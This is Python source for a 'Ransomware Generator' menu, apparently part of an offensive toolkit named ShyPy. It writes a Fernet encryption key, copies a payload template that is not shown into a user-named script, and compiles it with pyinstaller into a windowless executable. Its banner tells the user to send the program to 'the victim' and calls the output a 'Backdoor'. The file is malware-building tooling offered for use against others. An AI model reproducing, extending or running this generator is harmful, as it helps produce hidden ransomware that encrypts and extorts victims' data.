from cryptography.fernet import Fernet
from colorama import Fore as f
import platform
import os
import time

def clear_terminal():
    os_name = platform.system().lower()
    if os_name == "linux" or os_name == "darwin":
        os.system("clear")
    elif os_name == "windows":
        os.system("cls")

class RansomWare_Generator():
    def __init__(self):
        self.start()
        
    def generate_key(self):
        key = Fernet.generate_key()
        with open("Modules/Ransomware_Generator/Key_File/key.key", "wb") as key_file:
            key_file.write(key)

    def ransomware_generator(self, name):
        if platform.system() == "Windows":
            os.system("cls")
            file_name = "Modules\Ransomware_Generator\Payloads\DefaultPayload.txt"
        else:
            os.system("clear")
            file_name = "Modules/Ransomware_Generator/Payloads/DefaultPayload.txt"

        file_loc = os.path.abspath(os.path.join(os.getcwd(), file_name))
        with open(name, "w", encoding="utf-8") as file:
            with open(file_loc, "r", encoding="utf-8") as file2:
                file_content = file2.read()
                file.write(file_content)
                
    def convert_to_exe(self, name):
        python_files = name
        if platform.system() == "Windows":
            os.system(f"pyinstaller --onefile --noconsole --clean {python_files}")
        else:
            os.system(f"pyinstaller --onefile --noconsole {python_files}")
    
    def ended(self, name):
        deleted_file = name
        os.remove(deleted_file)
        exe_location = name.replace(".py", ".exe")
        exe_loc = os.path.abspath(exe_location)
        dist_folder = os.path.abspath(os.path.join(exe_loc, os.pardir))
        print(f.RESET)
        clear_terminal()
        if platform.system() == "Windows":
            print(f"[!] RansomWare Was Created On this Location: {dist_folder}\dist\{exe_location} ") 
            print(f"[!] Key Was Created On This location: {dist_folder}\Key_File") 
        else:
            print(f"[!] RansomWare Was Created On this Location: {dist_folder}/dist/{exe_location} ")
            print(f"[!] Key Was Created On This location: {dist_folder}/Key_File") 
    
    def start(self):
        clear_terminal()
        print(f"""

            ╔══════════════════════════════════════════════════════════════════════╗
            ║*                     - Ransomware Generator -                       *║
            ╠══════════════════════════════════════════════════════════════════════╣
            ║RULES : In order for the program to be successful, it must be sent to ║
            ║the victim in the same file with the key, otherwise it will not work. ║
            ╠══════════════════════════════════╦═══════════════════════════════════╣ 
            ║            Commands              ║            Function               ║    
            ╠══════════════════════════════════╬═══════════════════════════════════╣   
            ║ "generate"                       : Generate a Backdoor.              ║
            ║ "back"                           : Back To Shypy.                    ║                              
            ╠══════════════════════════════════╩═══════════════════════════════════╣            
            ║*                            - The ShyPy -                           *║ 
            ╚══════════════════════════════════════════════════════════════════════╝
            \n\n""")
        
        answer = input("[ShyPy]: ") 
        
        if answer == "generate":
            user_rw_name = input("[+] The Name Of The User's RansomWare: ")
            user_rw_name = user_rw_name + ".py"
            self.generate_key()
            self.ransomware_generator(user_rw_name)
            self.convert_to_exe(user_rw_name)
            self.ended(user_rw_name)
            
        elif answer == "back":
            os.system("cd ..")
            os.system("cd ..")
            os.system("python Shypy.py")
        else:
            print(f.LIGHTYELLOW_EX + "[!] Invalid Option" + f.LIGHTCYAN_EX)
            time.sleep(0.5)
            self.start()

RG = RansomWare_Generator()